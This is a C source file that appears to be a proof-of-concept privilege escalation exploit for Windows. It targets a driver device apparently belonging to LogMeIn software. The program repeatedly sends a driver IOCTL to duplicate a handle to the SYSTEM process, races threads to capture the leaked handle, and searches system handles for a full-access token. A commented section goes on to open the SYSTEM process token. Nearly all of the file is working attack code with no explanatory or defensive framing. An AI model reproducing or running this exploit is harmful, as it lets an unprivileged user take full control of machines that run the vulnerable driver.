#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "ntdll")

#define IOCTL_DUPE_LEL 0x9211001C
#define SystemHandleInformation 16

typedef struct LMI_INFO {
	DWORD64 qwPid;
	DWORD64 reserved0;
	DWORD64 handleValue;
	DWORD64 reserved1;
} LMI_INFO, *PLMI_INFO;

typedef struct _PUBLIC_OBJECT_BASIC_INFORMATION {
	ULONG Attributes;
	ACCESS_MASK GrantedAccess;
	ULONG HandleCount;
	ULONG PointerCount;
	ULONG Reserved[10];    // reserved for internal use
} PUBLIC_OBJECT_BASIC_INFORMATION, * PPUBLIC_OBJECT_BASIC_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

// handle table information
typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

static_assert(sizeof(LMI_INFO) == 0x20, "must be 0x20 bytes");

typedef NTSTATUS(WINAPI* lpNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* lpNtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS(WINAPI* lpNtQueryObject)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* lpNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

lpNtQueryInformationProcess g_NtQueryInformationProcess = NULL;
lpNtDuplicateObject g_NtDuplicateObject = NULL;
lpNtQueryObject g_NtQueryObject = NULL;
lpNtQuerySystemInformation g_NtQuerySystemInformation = NULL;


HANDLE g_hCurrentProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
const SIZE_T szNumThreads = 2;
const char* g_strTargetProcName = "LMIGuardianService.exe";

VOID HandleSearchThread(LPVOID lpParam) {
	PUBLIC_OBJECT_BASIC_INFORMATION pobi = { 0 };
	Sleep((rand() + 500) % 1000);
	if (!lpParam) {
		return;
	}
	DWORD dwBytesReturned = 0;
	DWORD dwHandleCount = 0;
	BOOL bRes = FALSE;
	NTSTATUS status = g_NtQueryInformationProcess((HANDLE)-1, 20, &dwHandleCount, sizeof(DWORD), &dwBytesReturned);
	if (status) {
		printf("NtQueryInfoProc failed with 0x%lx\n", status);
		return;
	}

	HANDLE hCurrentProc = (HANDLE)-1;
	HANDLE hTargetHandle = 0;
	HANDLE hIter = (HANDLE)(((DWORD64)dwHandleCount * 4) + 4);
	HANDLE hBegin = hIter;
	
	while (TRUE) {
		hIter = (HANDLE)((DWORD64)hIter + 4);
		if ((DWORD64)hIter > 0x300) {
			hIter = hBegin;
		}

		ULONG ulBytesReturned = 0;
		status = g_NtQueryObject(hIter, 0, &pobi, sizeof(PUBLIC_OBJECT_BASIC_INFORMATION), &ulBytesReturned);
		DWORD dwPid = GetProcessId(hIter);
		if (!status && pobi.GrantedAccess && dwPid) {
			printf("hIter - %p | %lx | %d \n", hIter, pobi.GrantedAccess, dwPid);
			bRes = DuplicateHandle(g_hCurrentProc, hIter, g_hCurrentProc, &hTargetHandle, 0, 0, DUPLICATE_SAME_ACCESS);
			if (bRes) {
				//puts(":)");
				*(PHANDLE)lpParam = hTargetHandle;
				return;
			}
		}
	}
}

HANDLE QuerySystemHandlesForTargetProc() {
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20000);
	if (!lpBuf) {
		printf("HeapAlloc - %d\n", GetLastError());
		return INVALID_HANDLE_VALUE;
	}
	ULONG ulBytesReturned = 0;
	NTSTATUS status = g_NtQuerySystemInformation(SystemHandleInformation, lpBuf, 0x20000, &ulBytesReturned);

	while (status == 0xC0000004) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulBytesReturned + 0x1000);
		if (!lpBuf) {
			printf("HeapAlloc - %d\n", GetLastError());
			return INVALID_HANDLE_VALUE;
		}
		status = g_NtQuerySystemInformation(SystemHandleInformation, lpBuf, ulBytesReturned + 0x1000, &ulBytesReturned);
	}


	if (status) {
		printf("Query for handles failed, oops lmao. Did you expect a fully refined PoC? - %lx\n", status);
		return INVALID_HANDLE_VALUE;
	}

	PSYSTEM_HANDLE_INFORMATION pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)lpBuf;

	for (int i = 0; i < pSysHandleInfo->NumberOfHandles; i++) {
		SYSTEM_HANDLE_TABLE_ENTRY_INFO shtei = pSysHandleInfo->Handles[i];
		if (shtei.UniqueProcessId != 4) {
			continue;
		}

		if (shtei.ObjectTypeIndex == 5 && shtei.GrantedAccess == 0xf01ff) {
			printf("Found token with full access:\t%x - %x - %x\n", shtei.HandleValue, shtei.ObjectTypeIndex, shtei.GrantedAccess);
			return (HANDLE)shtei.HandleValue;
		}
	}

	return INVALID_HANDLE_VALUE;
}

int main() {
	LMI_INFO lmii = { 0 };
	BOOL bRes = FALSE;
	HANDLE hHeap = GetProcessHeap();
	DWORD dwBytesReturned = 0;
	LPVOID lpOutBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000);
	HANDLE hThreads[szNumThreads] = { 0 };
	HANDLE hSysProc = 0;

	printf("hCurProc = %p\n", g_hCurrentProc);
	
	if (!lpOutBuf) {
		printf("HeapAlloc : %lx\n", GetLastError());
		return -1;
	}

	HMODULE hNtdll = GetModuleHandleA("ntdll");
	if (!hNtdll) {
		printf("Could not get handle to ntdll");
		return -1;
	}

	g_NtQueryInformationProcess = (lpNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (!g_NtQueryInformationProcess) {
		printf("Could not find NtQueryInformationProcess");
		return -1;
	}

	g_NtDuplicateObject = (lpNtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
	if (!g_NtDuplicateObject) {
		printf("Could not find NtDuplicateObject");
		return -1;
	}

	g_NtQueryObject = (lpNtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");
	if (!g_NtQueryObject) {
		printf("Could not find NtQueryObject");
		return -1;
	}

	g_NtQuerySystemInformation = (lpNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	if (!g_NtQuerySystemInformation) {
		printf("Could not find NtQuerySystemInformation");
		return -1;
	}

	HANDLE hTargetValue = QuerySystemHandlesForTargetProc();
	getchar();
	for (int i = 0; i < szNumThreads; i++) {
		DWORD dwThreadId = 0;
		hThreads[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HandleSearchThread, &hSysProc, 0, &dwThreadId);
		if (!hThreads[i] || !dwThreadId) {
			printf("CreateThread failed with status %lx", GetLastError());
		}
		printf("Created thread id %d\n", i);
	}


	const char* strDevName = R"(\\.\LMIInfo)";
	HANDLE hDevice = CreateFileA(
		strDevName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);


	if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
		printf("CreateFileA : %lx\n", GetLastError());
		return -1;
	}

	puts("Opened device");
	puts("Creating handle search thread");

	lmii.qwPid = 4;
	lmii.handleValue = 4;//0x1354;
	while (TRUE) {
		bRes = DeviceIoControl(
			hDevice,
			IOCTL_DUPE_LEL,
			&lmii,
			sizeof(LMI_INFO),
			lpOutBuf,
			0x1000,
			&dwBytesReturned,
			NULL
		);

		if (hSysProc) {
			break;	
		}
	}

	for (int i = 0; i < szNumThreads; i++) {
		TerminateThread(hThreads[i], 0);
	}
	puts("doot");
	getchar();

	/*HANDLE hTokeMyDude;
	bRes = OpenProcessToken(hSysProc, TOKEN_ALL_ACCESS, &hTokeMyDude);
	if (!bRes) {
		printf("Fuggggg xD - %lx", GetLastError());
	}

	

	return 0;*/

}